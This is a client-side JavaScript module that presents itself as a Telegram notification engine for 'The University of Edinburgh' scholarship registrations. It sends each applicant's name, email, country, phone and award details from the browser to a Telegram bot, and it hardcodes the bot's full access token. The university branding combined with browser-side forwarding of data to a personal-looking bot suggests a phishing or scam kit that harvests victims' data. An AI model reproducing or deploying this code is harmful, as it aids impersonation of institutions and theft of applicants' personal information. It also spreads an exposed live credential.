// js/telegram.js — Client-side Telegram Notification Engine
// Connects directly to Telegram Bot @assistmetobot (Token: 8613266324:AAH_XyegD48W-Yx9_aC_MKl5OgZ1cT9fd9M)

export const BOT_TOKEN = '8613266324:AAH_XyegD48W-Yx9_aC_MKl5OgZ1cT9fd9M';
export const BOT_USERNAME = 'assistmetobot';
export const BOT_LINK = `https://t.me/${BOT_USERNAME}`;

function esc(text) {
  return String(text || 'N/A')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

/**
 * Get active chat ID from localStorage or auto-resolve from getUpdates API
 */
export async function getChatId() {
  const lastToken = localStorage.getItem('tg_bot_token_ver');
  if (lastToken !== BOT_TOKEN) {
    localStorage.removeItem('tg_chat_id');
    localStorage.setItem('tg_bot_token_ver', BOT_TOKEN);
  }

  const stored = localStorage.getItem('tg_chat_id');
  if (stored && stored.trim()) {
    return stored.trim();
  }

  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
    const data = await res.json();
    if (data.ok && data.result && data.result.length > 0) {
      for (let i = data.result.length - 1; i >= 0; i--) {
        const item = data.result[i];
        const chat = item.message?.chat || 
                     item.callback_query?.message?.chat || 
                     item.my_chat_member?.chat || 
                     item.channel_post?.chat;
        if (chat && chat.id) {
          const cid = String(chat.id);
          localStorage.setItem('tg_chat_id', cid);
          console.log(`[Telegram] Auto-connected chat ID: ${cid} (${chat.first_name || chat.username || ''})`);
          return cid;
        }
      }
    }
  } catch (e) {
    console.warn('[Telegram] Could not query getUpdates:', e.message);
  }
  return null;
}

export function setCustomChatId(chatId) {
  if (chatId) {
    localStorage.setItem('tg_chat_id', String(chatId).trim());
    return true;
  }
  return false;
}

/**
 * Send an administrative notification message to the Telegram bot
 */
export async function sendTelegramAlert(details) {
  const {
    fullName = '',
    email = '',
    country = '',
    phone = '',
    eventType = 'New Student Registration',
    scholarshipTitle = '',
    amount = '',
    extra = ''
  } = details;

  try {
    const chatId = await getChatId();
    if (!chatId) {
      console.warn(`[Telegram Alert] No chat ID linked yet. Open ${BOT_LINK} and send /start to receive alerts!`);
      return { ok: false, reason: 'NO_CHAT_ID', botLink: BOT_LINK };
    }

    const lines = [
      `🎓 <b>The University of Edinburgh</b>`,
      `🔔 <b>Alert:</b> ${esc(eventType)}`,
      `━━━━━━━━━━━━━━━━━━━━━━`,
      `👤 <b>Applicant:</b> ${esc(fullName)}`,
      `📧 <b>Email:</b> ${esc(email)}`,
      `🌍 <b>Country:</b> ${esc(country)}`,
      phone ? `📞 <b>Phone:</b> ${esc(phone)}` : '',
      scholarshipTitle ? `🏆 <b>Target Scholarship:</b> ${esc(scholarshipTitle)}` : '',
      amount ? `💰 <b>Award:</b> ${esc(amount)}` : '',
      extra ? `📋 <b>Details:</b>\n${esc(extra)}` : '',
      `━━━━━━━━━━━━━━━━━━━━━━`,
      `⏱️ <b>Time:</b> ${new Date().toUTCString()}`
    ].filter(Boolean);

    const text = lines.join('\n');

    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });

    const data = await res.json();
    return { ok: data.ok, result: data.result };
  } catch (err) {
    console.warn('[Telegram Alert Error]', err.message);
    return { ok: false, reason: err.message };
  }
}

export async function sendTestMessage() {
  return await sendTelegramAlert({
    fullName: 'System Test Alert',
    email: 'admin@ed.ac.uk',
    country: 'United Kingdom',
    eventType: '⚡ Live Telegram Notification Channel Test',
    extra: 'Telegram real-time dispatch channel active and operational.'
  });
}

export async function initTelegram() {
  await getChatId();
}

export async function promptForChatId() {
  return await getChatId();
}
